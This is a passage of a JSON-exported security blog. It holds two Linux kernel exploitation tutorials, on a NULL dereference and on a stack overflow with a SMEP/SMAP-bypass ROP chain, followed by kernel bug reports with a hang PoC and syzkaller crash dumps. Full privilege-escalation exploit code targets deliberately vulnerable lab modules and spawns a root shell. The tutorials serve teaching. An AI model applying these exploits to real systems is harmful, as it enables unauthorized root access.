vm.mmap_min_addr=0\nvm.mmap_min_addr = 0\n```\n\nAnd of course, getting root privileges, we need to call **commit_creds(prepare_kernel_cred(0))**.\nThey can get from */proc/kallsyms*\n\n```c\nzero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep commit_creds\nffffffffb26adf00 T commit_creds\n...\nzero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep prepare_kernel_cred\nffffffffb26ae2b0 T prepare_kernel_cred\n...\n```\n\nHere's a simple attack code.\n\n```c\n#define _GNU_SOURCE\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n\n#include <sys/types.h>\n#include <sys/mman.h>\n\nstruct cred;\nstruct task_struct;\n\ntypedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));\ntypedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));\n\nprepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)0xffffffffb26ae2b0;\ncommit_creds_t commit_creds = (commit_creds_t)0xffffffffb26adf00;\n\nvoid get_shell() { if (getuid() == 0) system(\"/bin/sh\"); }\nvoid get_root() { commit_creds(prepare_kernel_cred(0)); }\n\nint main(int argc, char *argv[]) {\n\tprintf(\"\\e[36m[*] Stage 1 - Allocate 0x0\\n\");\n\t\n\tif (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {\n\t    perror(\"mmap()\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n    unsigned char shellcode[] = {\n\t    /* call get_root() */\n\t    0x48, 0xb8,\n\t    0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()\n\t    0xff, 0xd0, 0x48,                               // call rax\n\t};\n\t\n\tvoid **offset = 0;\n\toffset = rawmemchr(shellcode, 0x42);\n\t(*offset) = get_root;\n\n\tmemcpy((void *)0, shellcode, sizeof(shellcode));\n\t\n\tprintf(\"\\e[36m[*] Stage 2 - Trigger NULL dereference\\n\");\n\t\n    int fd = open(\"/proc/bug1\", O_WRONLY);\n    write(fd, \"asdf\", 4); // trigger\n    \n    get_shell(); // get shell\n}\n```\n\ncompile just like this.\n\n```c\ngcc -o tri tri.c\n```\n\ncompile & run this program. But it'll not work on this system right away because of SMEP :(.\nyou can also see like this dmesg.\n\n```c\n[13416.790759] tri[5985]: segfault at c4f943d ip 00005570bdfcd8aa sp 00007ffd0c4f9420 error 6 in tri[5570bdfcd000+1000]\n[13423.943053] tri[5989]: segfault at ffffffffd5f9799d ip 00005617eefed8aa sp 00007ffed5f97980 error 7 in tri[5617eefed000+1000]\n[13683.767595] tri[6041]: segfault at 904db6d ip 00005587d5bdb907 sp 00007ffe0904db50 error 6 in tri[5587d5bdb000+1000]\n[14006.136039] unable to execute userspace code (SMEP?) (uid: 1000)\n[14006.136042] BUG: unable to handle kernel NULL pointer dereference at           (null)\n[14006.136044] IP:           (null)\n...\nOops: 0011 [#2] SMP PTI\n...\n[14006.136122] RIP: 0010:          (null)\n[14006.136123] RSP: 0018:ffffb2ca8636fdf0 EFLAGS: 00010286\n[14006.136124] RAX: 0000000000000000 RBX: 0000000000000004 RCX: ffffb2ca8636fef8\n[14006.136125] RDX: 0000000000000004 RSI: 000056214844eb2f RDI: ffff907236ba2a00\n[14006.136126] RBP: ffffb2ca8636fe00 R08: 0000000000000001 R09: 0000000000000002\n[14006.136127] R10: 0000000000000000 R11: 0000000000000246 R12: fffffffffffffffb\n[14006.136128] R13: ffffb2ca8636fef8 R14: 000056214844eb2f R15: ffff907236ba2a00\n[14006.136129] FS:  00007f74c141f740(0000) GS:ffff907239680000(0000) knlGS:0000000000000000\n[14006.136130] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[14006.136131] CR2: 0000000000000000 CR3: 0000000067984004 CR4: 00000000003606e0\n[14006.136152] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[14006.136153] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\n\n```\n\nAs followed, RIP is successfully changed into NULL but, we can't execute userland code because of SMEP.\nSo, we need to bypass SMEP additionally :(.\n\n* SMEP : Supervisor Mode Execution Protection (meaning userland code cannot be executed in kernelland)\n\nBut, fortunately, bypassing SMEP isn't hard as well :). Just overwriting Bit 20 of CR4 register to zero and doing other stuffs...\nWith above case, **CR4 value is 00000000003606e0**.\n\n```c\n>>> bin(0x3606e0)\n'0b11 0110 0000 0110 1110 0000'\n```\n\nBut, in this case, it's complicated to handle SMEP because there's no kernelland area to execute the code disabling SMEP before NULL dereference triggered, (meaning before userland code executed).\nSo, in the next post, with another case, I'll finish the payload with the bypasses.\n\n## Epilogue\n\nBut, the above cases have a lot of limitations. At first, in the real world, with NULL dereference can't be triggered because of mmap min address.\nThe second is that we need to leak kernel base address with another vulnerability to get commit_Creds & prepare_kernel_cred, etc.\nLast is considering default kernel protections like SMEP/SMAP, etc.\n","excerpt":"Case Let's get down to the point this time. I'll give an example code that has a NULL dereference vulnerability.\nThe testing Environment is…","fields":{"slug":"/NULL-Dereference-Tutorial/"},"frontmatter":{"date":"Feb 27, 2018","title":"Linux Kernel - NULL Dereference Tutorial","tags":["Security","Linux-Kernel"],"update":"Feb 27, 2018"},"timeToRead":8}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nIn this article, we're going to exploit an LK module that has a stack overflow vulnerability by bypassing SMEP.\n\n## Background\n\nBefore we start, there're some concepts for bypassing those protections.\n\n* SMEP/SMAP : Supervisor Mode Execution/Access Protection.\n\nThis means userland code cannot be executed by the kernel. And its state is saved in Bit 20/21 of the CR4 register.\n\n![CR4_Register](cr4_register.png)\n\nTo check whether it is activated or not, just read */proc/cpuinfo*, then find **smep**.\n\n```c\nzero@ubuntu:~$ cat /proc/cpuinfo | grep flags\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 invpcid rtm mpx rdseed adx smap clflushopt xsaveopt xsavec xsaves arat\n...\n```\n\nYou can see SMEP/SMAP is enabled.\n\n* KASLR : Kernel Address Space Layout Randomization\n\nIn every boot, the kernel base address is changed randomly. So, we need to leak its address in several ways.\n\nIn this example, I just add a function that gets kernel base address for helping exploit easier.\n\n## Case\n\nThis time, I'll give an example code that has a stack-based overflow vulnerability.\nThe testing Environment is like below.\n\n```c\nzero@ubuntu:~/Desktop/LK/bug2$ uname -a\nLinux ubuntu 4.15.4-041504-generic #201802162207 SMP Fri Feb 16 22:08:57 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nzero@ubuntu:~/Desktop/LK/bug2$ lsb_release -a\nNo LSB modules are available.\nDistributor ID:\tUbuntu\nDescription:\tUbuntu Bionic Beaver (development branch)\nRelease:\t18.04\nCodename:\tbionic\nzero@ubuntu:~/Desktop/LK/bug2$ gcc -q -v\n...\ngcc version 7.3.0 (Ubuntu 7.3.0-3ubuntu1)\n```\n\n## Code\n\nHere's a Makefile & vulnerable code.\n\n```c\nobj-m += bug2.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n```\n\n```c\n#include <linux/init.h>\n#include <linux/module.h> \n#include <linux/proc_fs.h>\n#include <linux/kernel.h>\n\n#include <linux/slab.h>\n#include <linux/fs.h>\n#include <linux/cdev.h> \n#include <linux/device.h>\n\n#include <asm/uaccess.h>\n\nstatic struct proc_dir_entry *my_proc = NULL;\n\nstatic ssize_t my_write(struct file *file, const char *buf, size_t len, loff_t *data) {\n    char buffer[32];\n    \n    if(raw_copy_from_user(buffer, buf, len))\n        return -EFAULT;\n    \n    buffer[len - 1] = '\\0';\n    printk(\"[+] write %s (%ld bytes)\\n\", buffer, len);\n    \n    return len;\n}\n\nstatic const struct file_operations fops = {\n    .owner = THIS_MODULE,\n    .write = my_write\n};\n\nvoid __exit my_exit_module(void) {\n    remove_proc_entry(\"bug2\", NULL);\n    printk(\"[-] bug2 module unloaded\\n\");\n}\n\nint __init my_init_module(void) {\n    my_proc = proc_create(\"bug2\", 0666, NULL, &fops);\n    \n    if(my_proc == NULL)\n        return -ENOMEM;\n    \n    printk(\"[+] bug2 module loaded\\n\");\n    return 0;    \n}\n\nmodule_init(my_init_module);\nmodule_exit(my_exit_module);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"zer0day\");\n```\n\nYou can test a module like below to check working well.\n\n```c\nzero@ubuntu:~/Desktop/LK/bug2$ echo \"asdf\" > /proc/bug2; dmesg | tail -n 1\n[ 1096.475854] [+] write asdf (5 bytes)\n```\n\n## Attack\n\nLet me explain how to build a fully ROP chain for bypass SMEP/SMAP in order.\n\n* backup userland context\n\n> userland cs, ss, rflags, rsp\n\n* overwrite CR4 with value 0x606e0. (remove Bit 20 of CR4 register)\n\n> pop reg; ret; <br/>\n \\xe0\\x06\\x06\\x00\\x00\\x00\\x00\\x00 <br/>\n  mov cr4, reg; ret;\n\n* call commit_creds(prepare_kernel_cred(0)).\n\n> &get_root()\n\n* swapgs;\n* iretq; construct safe structure with userland context. And arrange registers in following order.\n\n```c\nswapgs;\niretq;\nrip (to &get_shell)\ncs\nrflags\nrsp\nss\n```\n\nHere's final PoC code.\n\n```c\n#define _GNU_SOURCE\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n\n#include <sys/types.h>\n#include <sys/mman.h>\n\nstruct cred;\nstruct task_struct;\n\ntypedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));\ntypedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));\n\nprepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)0xffffffffb26ae2b0;\ncommit_creds_t commit_creds = (commit_creds_t)0xffffffffb26adf00;\n\nvoid get_shell() { if (getuid() == 0) system(\"/bin/sh\"); }\nvoid get_root() { commit_creds(prepare_kernel_cred(0)); }\n\nunsigned long user_cs = 0x0;\nunsigned long user_ss = 0x0;\nunsigned long user_rsp = 0x0;\nunsigned long user_rflags = 0x0;\n\nvoid backup_stat() {  \n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) ::\"memory\"\n    );\n}\n\nint main(int argc, char *argv[]) {\n\tprintf(\"\\e[36m[*] Stage 1 - Allocate 0x0\\n\");\n\t\n\tif (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {\n\t    perror(\"mmap()\");\n\t\treturn EXIT_FAILURE;\n\t}\n\t\n\t// opcodes that used in this shellcode need to be changed to gadgets.\n\t// y can simply get gadgets with ROPgadget tools or anything from vmlinux.\n    unsigned char shellcode[] = {\n        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, \n        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\n        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\n        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\n        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // need proper size of paddings just before at RIP.\n        /* SMEP/SMAP Bypass */\n\t    // 0x68,\n\t    0x5f, 0xc3,                                     // pop rdi; ret;\n\t    0xe0, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, // 0x00000000000606e0 // SMEP/SMAP off\n\t    0x0f, 0x22, 0xe7,                               // mov cr4, rdi;\n\t    0x5d, 0xc3,                                     // pop rbp; ret;\n\t    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // rbp\n\t    /* call get_root() */\n\t    // 0x48, 0xb8,\n\t    // 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()\n\t    // 0xff, 0xd0, 0x48,                               // call rax\n\t    0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // &get_root()\n\t    /* userland info */\n\t    0x0f, 0x01, 0xf8,                               // swapgs;\n\t    0x5d, 0xc3,                                     // pop rbp; ret;\n\t    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // rbp\n\t    0x48, 0xcf,                                     // iretq;\n\t    // rip = get_shell\n        // cs = user_cs\n        // rflags = user_rflags\n        // rsp = asm('rsp')\n        // ss = user_ss\n\t    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, // rip     : get_shell()\n\t    0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, // cs      : user_cs\n\t    0x45, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, // rflags  : user_rflags\n\t    0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, // rsp     : user_rsp\n\t    0x47, 0x47, 0x47, 0x45, 0x47, 0x47, 0x47, 0x47, // ss      : user_ss\n\t};\n\t\n\tbackup_stat(); // backup userland context\n\t\n\tvoid **offset = 0;\n\t\n\toffset = rawmemchr(shellcode, 0x42);\n\t(*offset) = get_root;\n\t\n\toffset = rawmemchr(shellcode, 0x43);\n\t(*offset) = get_shell;\n\t\n\toffset = rawmemchr(shellcode, 0x44);\n\t(*offset) = &user_cs;\n\t\n\toffset = rawmemchr(shellcode, 0x45);\n\t(*offset) = &user_rflags;\n\t\n\toffset = rawmemchr(shellcode, 0x47);\n\t(*offset) = &user_ss;\n\t\n\tregister unsigned long rsp asm(\"rsp\");\n\tuser_rsp = (unsigned long)rsp;\n\t\n\toffset = rawmemchr(shellcode, 0x46);\n\t(*offset) = &user_rsp;\n\t\n\tmemcpy((void *)0, shellcode, sizeof(shellcode));\n\t\n\tprintf(\"\\e[36m[*] Stage 2 - Trigger\\n\");\n\t\n    int fd = open(\"/proc/bug2\", O_WRONLY);\n    write(fd, shellcode, strlen(shellcode));\n    \n    get_shell();\n}\n```\n","excerpt":"TL;DR In this article, we're going to exploit an LK module that has a stack overflow vulnerability by bypassing SMEP. Background Before we …","fields":{"slug":"/Stack-Overflow-Tutorial/"},"frontmatter":{"date":"Feb 18, 2018","title":"Linux Kernel - Stack based Overflow Tutorial","tags":["Security","Linux-Kernel"],"update":"Feb 18, 2018"},"timeToRead":7}},{"node":{"rawMarkdownBody":"\n## getsockopt - task hung in lock_sock_nested\n\nPosting in a long time :) because of other stuff. I have a few LK bugs but skip it :).\n\nI just found a bug, task hung in lock_sock_nested on the latest LK (v4.16.0-rc1). Of course, from the conclusion, it's not a critical and meaningless bug for me :(.\nSo I just added a short PoC that can reproduce a bug and Call Trace.\n\n### Call Trace (Dump)\n\nHere's a Call Trace. task hung (default 120s).\n\n```c\nroot@zer0day:~# uname -a\nLinux zer0day 4.16.0-rc1+ #14 SMP Wed Feb 14 17:44:19 KST 2018 x86_64 GNU/Linux\nroot@zer0day:~# gcc -o poc poc.c\nroot@zer0day:~# ./poc\n[  369.631452] INFO: task poc:2481 blocked for more than 120 seconds.\n[  369.633340]       Not tainted 4.16.0-rc1+ #14\n[  369.634552] \"echo 0 > /proc/sys/kernel/hung_task_timeout_secs\" disables this message.\n[  369.636478] poc             D13984  2481   2464 0x00000000\n[  369.638015] Call Trace:\n[  369.638825]  ? __schedule+0x2a9/0xa90\n[  369.639792]  ? __local_bh_enable_ip+0x7b/0xe0\n[  369.640823]  schedule+0x2a/0x80\n[  369.641559]  __lock_sock+0xa1/0x130\n[  369.642395]  ? finish_wait+0x80/0x80\n[  369.643189]  lock_sock_nested+0x9f/0xb0\n[  369.643383]  ipv6_getorigdst+0x9e/0x2c0\n[  369.643572]  ? __mutex_unlock_slowpath+0x46/0x2b0\n[  369.643811]  ? nf_getsockopt+0x47/0x80\n[  369.643996]  nf_getsockopt+0x47/0x80\n[  369.644185]  ipv6_getsockopt+0x10a/0x170\n[  369.644380]  udpv6_getsockopt+0x40/0x80\n[  369.644569]  SyS_getsockopt+0x84/0xf0\n[  369.644754]  do_syscall_64+0x74/0x210\n[  369.644941]  entry_SYSCALL_64_after_hwframe+0x26/0x9b\n[  369.645200] RIP: 0033:0x7f340483008a\n[  369.645376] RSP: 002b:00007ffd08d09478 EFLAGS: 00000206 ORIG_RAX: 0000000000000037\n[  369.645742] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f340483008a\n[  369.646101] RDX: 0000000000000050 RSI: 0000000000000029 RDI: 0000000000000003\n[  369.646443] RBP: 00007ffd08d09490 R08: 00007ffd08d09480 R09: 00007f3404aec2e0\n[  369.646785] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000400450\n[  369.647148] R13: 00007ffd08d09570 R14: 0000000000000000 R15: 0000000000000000\n[  369.647499] \n[  369.647499] Showing all locks held in the system:\n[  369.647802] 1 lock held by khungtaskd/439:\n[  369.648026]  #0:  (tasklist_lock){.+.+}, at: [<00000000d02fdb21>] debug_show_all_locks+0x37/0x1a0\n[  369.648470] 1 lock held by rsyslogd/2361:\n[  369.648687]  #0:  (&f->f_pos_lock){+.+.}, at: [<0000000066b64151>] __fdget_pos+0x52/0x60\n[  369.649092] 2 locks held by getty/2444:\n[  369.649279]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.649714]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.650156] 2 locks held by getty/2445:\n[  369.650343]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.650762]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.651203] 2 locks held by getty/2446:\n[  369.651390]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.651813]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.652256] 2 locks held by getty/2447:\n[  369.652443]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.652864]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.653305] 2 locks held by getty/2448:\n[  369.653492]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.653915]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.654356] 2 locks held by getty/2449:\n[  369.654542]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\n[  369.654961]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\n[  369.655424] 1 lock held by poc/2481:\n[  369.655599]  #0:  (sk_lock-AF_INET6){+.+.}, at: [<000000002374a639>] ipv6_getsockopt+0xf2/0x170\n[  369.656030] \n[  369.656108] =============================================\n[  369.656108]\n```\n\n### Bug\n\nWith the above Call Trace, I can notice, there is a lock_sock_nested in ipv6_getorigdst where the bug happened. \nAt **/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c:233**,\n\n```c\n...\nstatic int\nipv6_getorigdst(struct sock *sk, int optval, void __user *user, int *len)\n{\n\tstruct nf_conntrack_tuple tuple = { .src.l3num = NFPROTO_IPV6 };\n\tconst struct ipv6_pinfo *inet6 = inet6_sk(sk);\n\tconst struct inet_sock *inet = inet_sk(sk);\n\tconst struct nf_conntrack_tuple_hash *h;\n\tstruct sockaddr_in6 sin6;\n\tstruct nf_conn *ct;\n\t__be32 flow_label;\n\tint bound_dev_if;\n\n\tlock_sock(sk);\n\ttuple.src.u3.in6 = sk->sk_v6_rcv_saddr;\n\ttuple.src.u.tcp.port = inet->inet_sport;\n\ttuple.dst.u3.in6 = sk->sk_v6_daddr;\n\ttuple.dst.u.tcp.port = inet->inet_dport;\n\ttuple.dst.protonum = sk->sk_protocol;\n\tbound_dev_if = sk->sk_bound_dev_if;\n\tflow_label = inet6->flow_label;\n\trelease_sock(sk);\n\t...\n```\n\nAs you also know, **lock_sock_nested** looks like below. (*subclass* is zero in this case))\n\n```c\nvoid lock_sock_nested(struct sock *sk, int subclass)\n{\n\tmight_sleep(); // debug message is printed by this.\n\tspin_lock_bh(&sk->sk_lock.slock);\n\tif (sk->sk_lock.owned)\n\t\t__lock_sock(sk);\n\tsk->sk_lock.owned = 1;\n\tspin_unlock(&sk->sk_lock.slock);\n\t/*\n\t * The sk_lock has mutex_lock() semantics here:\n\t */\n\tmutex_acquire(&sk->sk_lock.dep_map, subclass, 0, _RET_IP_);\n\tlocal_bh_enable();\n}\n```\n\nIn short, maybe, there is a task hung in ipv6_getorigdst while holding the socket lock, so it's blocking other tasks too.\n\n### POC\n\nHere's a PoC code for reproducing.\n\n```c\n#define _GNU_SOURCE \n\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n\nint main() {\n\tint size = 4;\n\tvoid *p = (void *)0;\n\n\tint s = socket(0xa, 2, 0);           // socket@inet6_udp\n\tgetsockopt(s, 0x29, 0x50, p, &size); // getsockopt@inet6_int\n\n\treturn 0;\n}\n```\n\n## fifo_open - possible circular locking (leading to deadlock)\n\n### Call Trace (Dump)\n\n```c\nWARNING: possible circular locking dependency detected\n4.16.0-rc1+ #15 Not tainted\n------------------------------------------------------\nsyz-executor4/30664 is trying to acquire lock:\n (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] __pipe_lock fs/pipe.c:83 [inline]\n (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] fifo_open+0x77/0x3c0 fs/pipe.c:921\n\nbut task is already holding lock:\n (&sig->cred_guard_mutex){+.+.}, at: [<00000000a7717ddc>] prepare_bprm_creds+0x2a/0x80 fs/exec.c:1389\n\nwhich lock already depends on the new lock.\n\n\nthe existing dependency chain (in reverse order) is:\n\n-> #2 (&sig->cred_guard_mutex){+.+.}:\n       lock_trace+0x1f/0x70 fs/proc/base.c:408\n       proc_pid_stack+0x73/0x120 fs/proc/base.c:444\n       proc_single_show+0x4d/0x80 fs/proc/base.c:747\n       seq_read+0x10f/0x560 fs/seq_file.c:237\n       __vfs_read+0x50/0x1d0 fs/read_write.c:411\n       vfs_read+0xc0/0x1a0 fs/read_write.c:447\n       SYSC_read fs/read_write.c:573 [inline]\n       SyS_read+0x60/0xe0 fs/read_write.c:566\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\n-> #1 (&p->lock){+.+.}:\n       seq_read+0x51/0x560 fs/seq_file.c:165\n       do_loop_readv_writev fs/read_write.c:673 [inline]\n       do_iter_read+0x19f/0x1f0 fs/read_write.c:897\n       vfs_readv+0x96/0xe0 fs/read_write.c:959\n       kernel_readv fs/splice.c:361 [inline]\n       default_file_splice_read+0x241/0x3e0 fs/splice.c:416\n       do_splice_to+0x8c/0xc0 fs/splice.c:880\n       do_splice fs/splice.c:1173 [inline]\n       SYSC_splice fs/splice.c:1402 [inline]\n       SyS_splice+0x7ba/0x820 fs/splice.c:1382\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\n-> #0 (&pipe->mutex/1){+.+.}:\n       __mutex_lock_common kernel/locking/mutex.c:756 [inline]\n       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893\n       __pipe_lock fs/pipe.c:83 [inline]\n       fifo_open+0x77/0x3c0 fs/pipe.c:921\n       do_dentry_open+0x276/0x400 fs/open.c:752\n       vfs_open+0x5d/0xb0 fs/open.c:866\n       do_last fs/namei.c:3378 [inline]\n       path_openat+0x25b/0x1040 fs/namei.c:3518\n       do_filp_open+0xb9/0x150 fs/namei.c:3553\n       do_open_execat+0xa6/0x200 fs/exec.c:849\n       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740\n       do_execve fs/exec.c:1847 [inline]\n       SYSC_execve fs/exec.c:1928 [inline]\n       SyS_execve+0x34/0x40 fs/exec.c:1923\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\nother info that might help us debug this:\n\nChain exists of:\n  &pipe->mutex/1 --> &p->lock --> &sig->cred_guard_mutex\n\n Possible unsafe locking scenario:\n\n       CPU0                    CPU1\n       ----                    ----\n  lock(&sig->cred_guard_mutex);\n                               lock(&p->lock);\n                               lock(&sig->cred_guard_mutex);\n  lock(&pipe->mutex/1);\n\n *** DEADLOCK ***\n```\n\nSkip the Call Trace (Stack backtrace).\n\n## seq_read - possible circular locking (leading to deadlock)\n\n### Call Trace (Dump)\n\n```c\nWARNING: possible circular locking dependency detected\n4.16.0-rc1+ #15 Not tainted\n------------------------------------------------------\nsyz-executor2/10621 is trying to acquire lock:\n (&p->lock){+.+.}, at: [<00000000dad12130>] seq_read+0x51/0x560 fs/seq_file.c:165\n\nbut task is already holding lock:\n (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock_nested fs/pipe.c:62 [inline]\n (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock+0x25/0x30 fs/pipe.c:70\n\nwhich lock already depends on the new lock.\n\n\nthe existing dependency chain (in reverse order) is:\n\n-> #2 (&pipe->mutex/1){+.+.}:\n       __pipe_lock fs/pipe.c:83 [inline]\n       fifo_open+0x77/0x3c0 fs/pipe.c:921\n       do_dentry_open+0x276/0x400 fs/open.c:752\n       vfs_open+0x5d/0xb0 fs/open.c:866\n       do_last fs/namei.c:3378 [inline]\n       path_openat+0x25b/0x1040 fs/namei.c:3518\n       do_filp_open+0xb9/0x150 fs/namei.c:3553\n       do_open_execat+0xa6/0x200 fs/exec.c:849\n       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740\n       do_execve fs/exec.c:1847 [inline]\n       SYSC_execve fs/exec.c:1928 [inline]\n       SyS_execve+0x34/0x40 fs/exec.c:1923\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\n-> #1 (&sig->cred_guard_mutex){+.+.}:\n       lock_trace+0x1f/0x70 fs/proc/base.c:408\n       proc_pid_stack+0x73/0x120 fs/proc/base.c:444\n       proc_single_show+0x4d/0x80 fs/proc/base.c:747\n       seq_read+0x10f/0x560 fs/seq_file.c:237\n       __vfs_read+0x50/0x1d0 fs/read_write.c:411\n       vfs_read+0xc0/0x1a0 fs/read_write.c:447\n       SYSC_read fs/read_write.c:573 [inline]\n       SyS_read+0x60/0xe0 fs/read_write.c:566\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\n-> #0 (&p->lock){+.+.}:\n       __mutex_lock_common kernel/locking/mutex.c:756 [inline]\n       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893\n       seq_read+0x51/0x560 fs/seq_file.c:165\n       proc_reg_read+0x65/0xc0 fs/proc/inode.c:218\n       do_loop_readv_writev fs/read_write.c:673 [inline]\n       do_iter_read+0x19f/0x1f0 fs/read_write.c:897\n       vfs_readv+0x96/0xe0 fs/read_write.c:959\n       kernel_readv fs/splice.c:361 [inline]\n       default_file_splice_read+0x241/0x3e0 fs/splice.c:416\n       do_splice_to+0x8c/0xc0 fs/splice.c:880\n       do_splice fs/splice.c:1173 [inline]\n       SYSC_splice fs/splice.c:1402 [inline]\n       SyS_splice+0x7ba/0x820 fs/splice.c:1382\n       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287\n       entry_SYSCALL_64_after_hwframe+0x26/0x9b\n\nother info that might help us debug this:\n\nChain exists of:\n  &p->lock --> &sig->cred_guard_mutex --> &pipe->mutex/1\n\n Possible unsafe locking scenario:\n\n       CPU0                    CPU1\n       ----                    ----\n  lock(&pipe->mutex/1);\n                               lock(&sig->cred_guard_mutex);\n                               lock(&pipe->mutex/1);\n  lock(&p->lock);\n\n *** DEADLOCK ***\n```\n\nSkip the Call Trace (Stack backtrace).\n\n## pfifo_fast_enqueue - unable to handle kernel paging request\n\nI just got this bug from syzkaller today on LK v4.16.0-rc1.\n\n### Call Trace (Dump)\n\n```c\nIP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]\nIP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638\nPGD 5f758067 P4D 5f758067 PUD 5f759067 PMD 7fa34067 PTE 800000003a9f7060\nOops: 0000 [#1] SMP DEBUG_PAGEALLOC PTI\nDumping ftrace buffer:\n   (ftrace buffer empty)\nModules linked in:\nCPU: 0 PID: 2766 Comm: syz-fuzzer Not tainted 4.16.0-rc1+ 